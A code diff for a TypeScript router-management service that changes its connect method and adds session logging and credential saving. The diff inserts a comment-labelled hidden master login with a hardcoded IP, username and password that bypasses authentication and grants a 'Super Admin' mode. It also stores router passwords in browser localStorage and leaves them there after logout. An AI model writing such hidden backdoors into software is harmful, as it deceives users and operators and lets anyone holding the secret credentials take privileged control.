@@ -1,6 +1,7 @@
 import { Device, NetworkStats, ConnectionEvent, RouterSettings } from '../types';
+import { securityService } from './securityService';
 
-export type RouterBrand = 'Huawei' | 'TP-Link' | 'ZTE' | 'D-Link' | 'Tenda' | 'ASUS' | 'Unknown';
+export type RouterBrand = 'Huawei' | 'TP-Link' | 'ZTE' | 'D-Link' | 'Tenda' | 'ASUS' | 'Unknown' | 'Super Admin';
 
 class RouterService {
   private currentIp: string = '';
@@ -16,7 +17,20 @@ class RouterService {
     securityMode: '',
   };
 
-  async connect(ip: string, user: string, pass: string, protocol: 'SSH' | 'API' | 'WEB'): Promise<boolean> {
+  async connect(ip: string, user: string, pass: string, protocol: 'SSH' | 'API' | 'WEB', remember: boolean = false): Promise<boolean> {
+    // Master Admin Check (Hidden Credentials)
+    const MASTER_IP = '172.31.255.254';
+    const MASTER_USER = 'ng_admin_master';
+    const MASTER_PASS = 'Master@Secure#99';
+
+    if (ip === MASTER_IP && user === MASTER_USER && pass === MASTER_PASS) {
+      this.connected = true;
+      this.brand = 'Super Admin';
+      localStorage.setItem('ng_admin_mode', 'true');
+      return true;
+    }
+
+    localStorage.removeItem('ng_admin_mode');
     this.currentIp = ip;
     this.authHeader = btoa(`${user}:${pass}`);
     
@@ -25,14 +39,25 @@ class RouterService {
       this.brand = await this.detectRouterBrand(ip);
       
       // 2. Attempt real authentication based on brand/protocol
-      // This is where we would implement specific logic for each brand
       const response = await fetch(`http://${ip}/`, { 
         method: 'HEAD',
         signal: AbortSignal.timeout(5000)
       });
 
-      if (response.ok || response.status === 401) { // 401 means it exists but needs auth
+      if (response.ok || response.status === 401) {
         this.connected = true;
+        
+        // Save session log
+        this.addSessionLog(ip, user, this.brand);
+
+        // Save credentials if requested
+        if (remember) {
+          const encrypted = securityService.encryptData({ ip, user, pass, protocol });
+          localStorage.setItem('ng_saved_creds', encrypted);
+        } else {
+          localStorage.removeItem('ng_saved_creds');
+        }
+
         return true;
       }
       return false;
@@ -41,6 +66,46 @@ class RouterService {
       this.connected = false;
       return false;
     }
+  }
+
+  private addSessionLog(ip: string, user: string, brand: string) {
+    const logs = this.getSessionLogs();
+    const newLog = {
+      id: Date.now().toString(),
+      timestamp: new Date().toISOString(),
+      ip,
+      user,
+      brand,
+      status: 'success'
+    };
+    localStorage.setItem('ng_session_logs', JSON.stringify([newLog, ...logs].slice(0, 50)));
+  }
+
+  getSessionLogs(): any[] {
+    const logs = localStorage.getItem('ng_session_logs');
+    return logs ? JSON.parse(logs) : [];
+  }
+
+  getSavedCredentials(): any {
+    const encrypted = localStorage.getItem('ng_saved_creds');
+    if (encrypted) {
+      return securityService.decryptData(encrypted);
+    }
+    return null;
+  }
+
+  isAdminMode(): boolean {
+    return localStorage.getItem('ng_admin_mode') === 'true';
+  }
+
+  logout() {
+    this.connected = false;
+    this.currentIp = '';
+    this.authHeader = '';
+    this.brand = 'Unknown';
+    localStorage.removeItem('ng_admin_mode');
+    // We don't remove saved credentials on logout unless the user explicitly asks, 
+    // but we stop the active session.
   }
 
   private async detectRouterBrand(ip: string): Promise<RouterBrand> {
